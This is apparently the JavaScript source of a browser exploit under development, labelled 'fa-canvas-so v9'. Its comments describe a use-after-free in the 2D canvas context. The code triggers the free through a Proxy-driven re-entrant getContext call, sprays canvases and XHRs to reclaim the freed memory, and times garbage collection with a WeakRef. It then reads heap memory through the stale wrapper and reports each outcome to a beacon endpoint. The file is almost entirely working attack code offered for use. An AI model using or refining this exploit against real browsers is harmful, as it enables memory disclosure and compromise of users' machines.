mise ~/.config/mise/config.toml tools: gh@2.102.0
// fa-canvas-so — v9: second-order UAF (GC-timed free) + safe-ticket lottery
//
// v8 established the dual-wrapper state: after a live-context reclaim, the
// stale wrapper W1 and the spray wrapper W2 are TWO DISTINCT JS wrappers for
// one C++ CanvasRenderingContext2D (wrapperSame=false) with bidirectional
// write-through. v9 turns that into a second-order UAF with ATTACKER-TIMED
// freeing:
//
//   SO1: 1) plain double-create → W1 stale (engine-timed free)
//        2) live-context spray → ctx_c (canvas_C) reclaims the slot,
//           dual-wrapper state (safe: R2-proven)
//        3) capture identity, then drop W2 + canvas_C refs — keep ONLY W1
//        4) GC pressure until a WeakRef on canvas_C reports it collected:
//           the canvas destructor destroys ctx_c exactly when WE choose
//        5) immediately spray live contexts again → the slot (freed at the
//           GC) is reclaimed by a planned object
//        6) W1.canvas identity + W1 === sprayCtxs2[j] → did W1 reattach
//           through a SECOND destruction/reclaim cycle?
//
//   EL1-4: element-lottery rounds (v8's L1 died on an 0x60-AB ticket —
//   this spray is XHRs ONLY: XMLHttpRequest sits in the 384-512 context
//   class per the v3-run-2 evidence, and its fields at the m_canvas offset
//   are real pointers (document RefPtrs etc.) → W1.canvas wraps a REAL
//   object → .width/.height read live heap memory — leak candidates with
//   survivable odds. width/height are beaconned immediately; tagName is
//   attempted last.
//
// Beacon prefix: VCX-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCX-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  // ── SO1: second-order UAF ───────────────────────────────────────────────
  function secondOrder(next) {
    var N = 200;
    var sprayCanvases = [];
    for (var p = 0; p < N; p++) {
      var c = document.createElement('canvas');
      c.width = 8; c.height = 8;
      sprayCanvases.push(c);
    }
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    var sprayCtxs = [];
    for (var s = 0; s < N; s++) sprayCtxs.push(sprayCanvases[s].getContext('2d'));
    // dual-wrapper state; capture identity (R2-protected reads)
    var aliasIdx = -1, wrapSame = 'n/a';
    try {
      var ic = inner.canvas;
      if (ic === canvas) { B('SO-IDENT1', 'original'); }
      else {
        for (var k = 0; k < N; k++)
          if (ic === sprayCanvases[k]) { aliasIdx = k; break; }
        B('SO-IDENT1', aliasIdx >= 0 ? ('spray' + aliasIdx) : 'other');
      }
      if (aliasIdx >= 0) {
        wrapSame = String(inner === sprayCtxs[aliasIdx]);
        B('SO-WRAP1', 'same=' + wrapSame);
      }
    } catch (e) { B('SO-IDENT1', 'throw'); setTimeout(next, 300); return; }

    if (aliasIdx < 0) { B('SO-NOALIAS'); setTimeout(next, 300); return; }

    // drop W2 + canvas_C; keep W1 and everything else alive
    var weakC;
    try { weakC = new WeakRef(sprayCanvases[aliasIdx]); }
    catch (e) { B('SO-WEAKREF-X'); weakC = null; }
    sprayCanvases[aliasIdx] = null;
    sprayCtxs[aliasIdx] = null;
    inner.lineWidth = 71.25; // exercise W1 while ctx_c lives (safe)

    B('SO-DROP', 'idx=' + aliasIdx);
    var round = 0;
    function churn() {
      for (var i = 0; i < 1000; i++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(round);
      round++;
      var alive = true;
      if (weakC) { try { alive = (weakC.deref() !== undefined); } catch (e) {} }
      if (alive && round < 60) { setTimeout(churn, 30); return; }
      B('SO-GC', weakC ? (alive ? 'timeout' : 'collected') : 'no-weakref');

      // the canvas died at OUR chosen time; ctx_c's slot is free.
      // immediately reclaim it with planned live contexts.
      var N2 = 200;
      var spray2 = [];
      for (var p2 = 0; p2 < N2; p2++) {
        var c2 = document.createElement('canvas');
        c2.width = 8; c2.height = 8;
        spray2.push(c2);
      }
      var ctxs2 = [];
      for (var s2 = 0; s2 < N2; s2++) ctxs2.push(spray2[s2].getContext('2d'));
      try {
        var ic2 = inner.canvas;
        if (ic2 === canvas) B('SO-IDENT2', 'original');
        else {
          var idx2 = -1;
          for (var k2 = 0; k2 < N2; k2++)
            if (ic2 === spray2[k2]) { idx2 = k2; break; }
          if (idx2 >= 0) {
            B('SO-IDENT2', 'spray' + idx2);
            B('SO-WRAP2', 'same=' + (inner === ctxs2[idx2]));
            // write-through across the second cycle
            inner.lineWidth = 83.5;
            var w2 = -1;
            for (var k3 = 0; k3 < N2; k3++) if (ctxs2[k3].lineWidth === 83.5) { w2 = k3; break; }
            B('SO-WRITETHRU2', w2 >= 0 ? ('hit' + w2) : 'miss');
          } else B('SO-IDENT2', 'other');
        }
      } catch (e) { B('SO-IDENT2', 'throw'); }
      B('SO-SURVIVED');
      setTimeout(next, 300);
    }
    churn();
  }

  // ── EL: XHR-ticket lottery ────────────────────────────────────────────
  function lottery(i, next) {
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    // free happened; reclaim with XHRs only (real pointers at m_canvas offset)
    var keep = [];
    for (var q = 0; q < 80; q++) {
      var x = new XMLHttpRequest();
      try { x.open('GET', BASE + '/ticket/' + i + '-' + q); } catch (e) {}
      keep.push(x);
    }
    try {
      var wc = inner.canvas;
      if (wc === canvas) { B('EL' + i + '-CANVAS', 'original'); }
      else {
        var w = '?', h = '?';
        try { w = String(wc.width); } catch (e) { w = 'X'; }
        try { h = String(wc.height); } catch (e) { h = 'X'; }
        B('EL' + i + '-SIZE', 'w=' + w + ' h=' + h);
        try { B('EL' + i + '-TAG', String(wc.tagName).substring(0, 16)); }
        catch (e) { B('EL' + i + '-TAG', 'X'); }
      }
    } catch (e) { B('EL' + i + '-CANVAS', 'throw:' + String(e).substring(0, 40)); }
    B('EL' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  var plan = [];
  plan.push(function(next) { secondOrder(next); });
  plan.push(function(next) { lottery(1, next); });
  plan.push(function(next) { lottery(2, next); });
  plan.push(function(next) { lottery(3, next); });
  plan.push(function(next) { lottery(4, next); });

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
